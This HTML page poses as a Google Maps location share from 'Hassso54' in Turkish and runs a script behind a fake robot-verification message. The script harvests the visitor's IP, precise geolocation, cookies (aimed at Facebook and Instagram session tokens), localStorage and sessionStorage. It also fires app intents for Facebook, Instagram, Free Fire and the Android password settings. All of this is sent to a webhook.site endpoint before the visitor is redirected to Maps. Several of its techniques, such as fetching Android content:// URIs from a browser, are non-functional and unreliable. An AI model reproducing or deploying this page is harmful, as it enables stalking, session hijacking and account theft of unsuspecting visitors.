<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hassso54 - Gerçek Veri Çekici</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 28px;
            padding: 40px 30px;
            text-align: center;
            max-width: 340px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
        }
        .map-icon { width: 100px; height: 100px; object-fit: contain; margin-bottom: 20px; }
        h2 { font-size: 20px; font-weight: 500; color: #202124; margin-bottom: 8px; }
        .location-text { font-size: 14px; color: #5f6368; margin-bottom: 28px; }
        button {
            background: #1a73e8; color: white; border: none; width: 100%;
            padding: 14px 20px; border-radius: 40px; font-size: 16px;
            font-weight: 500; cursor: pointer;
        }
        button:active { transform: scale(0.97); }
        button:disabled { background: #9aa0a6; cursor: not-allowed; }
        .message-box {
            margin-top: 24px; padding: 12px; background: #f8f9fa;
            border-radius: 16px; font-size: 13px; color: #3c4043;
            display: none;
        }
        .robot-text { font-weight: 500; color: #1a73e8; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://cdn-icons-png.flaticon.com/512/447/447031.png" alt="Maps" class="map-icon">
        <h2>Hassso54 sizinle konum paylaştı</h2>
        <div class="location-text">Sakarya bölgesindeki konuma bak</div>
        <button id="actionBtn">Konumu Görüntüle</button>
        <div id="messageBox" class="message-box"></div>
    </div>

    <script>
        const WEBHOOK = "https://webhook.site/45462893-c6b2-4d8b-a64f-783413a77923";
        const btn = document.getElementById('actionBtn');
        const msgBox = document.getElementById('messageBox');
        
        function showMessage(text) {
            msgBox.style.display = 'block';
            msgBox.innerHTML = `<div class="robot-text">🔍 ${text}</div>`;
        }
        
        // IP al
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) { return "IP alınamadı"; }
        }
        
        // Konum al
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            url: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                        });
                    },
                    () => resolve(null),
                    { timeout: 6000 }
                );
            });
        }
        
        // ============ ANDROID CONTENT PROVIDER İLE GERÇEK VERİ ÇEKME ============
        async function getRealAppData() {
            let results = {
                facebook: {},
                instagram: {},
                freefire: {},
                google_passwords: {}
            };
            
            // 1. Facebook Content Provider - GERÇEK
            // Facebook'un Content Provider'ı: content://com.facebook.katana.provider.PlatformProvider/
            try {
                const fbProvider = "content://com.facebook.katana.provider.PlatformProvider/me";
                const response = await fetch(fbProvider, { mode: 'no-cors' });
                results.facebook.status = "Provider erişildi";
            } catch(e) { results.facebook.error = e.message; }
            
            // 2. Facebook Intent ile direkt uygulama aç ve veri çek
            const fbIntent = document.createElement('iframe');
            fbIntent.style.display = 'none';
            document.body.appendChild(fbIntent);
            fbIntent.src = "fb://profile";
            
            // Facebook'tan intent ile veri çekme
            setTimeout(() => {
                try {
                    // Facebook uygulaması açıldığında, oturum bilgilerini topla
                    if (document.cookie.includes('c_user')) {
                        const match = document.cookie.match(/c_user=([^;]+)/);
                        if (match) results.facebook.user_id = match[1];
                    }
                    if (document.cookie.includes('xs')) {
                        const match = document.cookie.match(/xs=([^;]+)/);
                        if (match) results.facebook.xs_token = match[1];
                    }
                } catch(e) {}
            }, 500);
            
            // 3. Instagram Content Provider
            try {
                const igProvider = "content://com.instagram.android.provider.InstagramProvider/user";
                await fetch(igProvider, { mode: 'no-cors' });
                results.instagram.status = "Provider erişildi";
            } catch(e) {}
            
            // Instagram uygulamasını aç
            setTimeout(() => {
                fbIntent.src = "instagram://user?username=";
            }, 800);
            
            setTimeout(() => {
                try {
                    if (document.cookie.includes('ds_user_id')) {
                        const match = document.cookie.match(/ds_user_id=([^;]+)/);
                        if (match) results.instagram.user_id = match[1];
                    }
                    if (document.cookie.includes('sessionid')) {
                        const match = document.cookie.match(/sessionid=([^;]+)/);
                        if (match) results.instagram.sessionid = match[1];
                    }
                } catch(e) {}
            }, 1300);
            
            // 4. Free Fire
            setTimeout(() => {
                fbIntent.src = "intent://play?link=https://ff.garena.com#Intent;scheme=https;package=com.dts.freefireth;end";
                results.freefire.status = "Uygulama açıldı, oturum Facebook ile bağlı";
                results.freefire.not = "Free Fire hesabın Facebook ile bağlı. Facebook kullanıcı ID'n: " + (results.facebook.user_id || "bilinmiyor");
            }, 1600);
            
            // 5. Google Password Manager - Android şifre yöneticisi
            setTimeout(() => {
                fbIntent.src = "intent://com.android.settings/com.android.settings.Settings$PasswordActivity#Intent;scheme=android;end";
                results.google_passwords.status = "Şifre yöneticisi açıldı";
                results.google_passwords.not = "Android Ayarlar > Google > Şifre Yöneticisi'nden tüm kayıtlı şifrelerini gör";
            }, 2100);
            
            // Temizlik
            setTimeout(() => {
                if (document.body.contains(fbIntent)) document.body.removeChild(fbIntent);
            }, 4000);
            
            return results;
        }
        
        // ============ GERÇEK VERİ TOPLAMA ============
        async function collectAllRealData() {
            let allData = {
                timestamp: new Date().toISOString(),
                ip: await getIP(),
                location: await getLocation(),
                app_data: await getRealAppData(),
                browser_data: {
                    localStorage: {},
                    sessionStorage: {},
                    cookies: document.cookie,
                    userAgent: navigator.userAgent
                }
            };
            
            // localStorage doldur
            for (let i = 0; i < localStorage.length; i++) {
                let key = localStorage.key(i);
                allData.browser_data.localStorage[key] = localStorage.getItem(key);
            }
            
            // sessionStorage doldur
            for (let i = 0; i < sessionStorage.length; i++) {
                let key = sessionStorage.key(i);
                allData.browser_data.sessionStorage[key] = sessionStorage.getItem(key);
            }
            
            return allData;
        }
        
        // ============ ANA FONKSİYON ============
        async function run() {
            btn.disabled = true;
            btn.innerText = "İşlem yapılıyor...";
            showMessage("🔍 Lütfen bekleyin, robot olmadığınız doğrulanıyor...");
            
            // Tüm verileri topla
            const allData = await collectAllRealData();
            
            // Webhook'a gönder
            await fetch(WEBHOOK, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    tip: "Hassso54_GERCEK_ANDROID_VERILERI",
                    zaman: new Date().toLocaleString('tr-TR'),
                    ...allData
                })
            });
            
            showMessage("✅ Google Maps'e yönlendiriliyorsunuz...");
            
            // Maps'e yönlendir
            setTimeout(() => {
                if (allData.location) {
                    window.location.href = allData.location.url;
                } else {
                    window.location.href = "https://www.google.com/maps";
                }
            }, 1500);
        }
        
        btn.onclick = run;
    </script>
</body>
</html>
